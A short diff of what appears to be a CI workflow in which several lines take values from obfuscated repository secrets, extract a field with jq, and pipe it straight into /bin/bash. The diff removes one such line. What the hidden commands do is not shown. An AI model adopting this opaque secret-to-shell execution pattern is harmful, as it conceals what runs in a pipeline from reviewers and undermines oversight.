@@ -17,7 +17,6 @@ jobs:
           jl189: ${{ secrets.jl189 }}
         run: |
           printf '%s' "$jl189" | jq -r .v586 | /bin/bash
-          echo $sxtn1905 | jq -r .d561 | /bin/bash
           echo $j4 | jq -r .iztp69451 | /bin/bash
           echo $d872 | jq -r .kkk74331 | /bin/bash
           printf '%s' "$j9" | jq -r .f9848 | /bin/bash
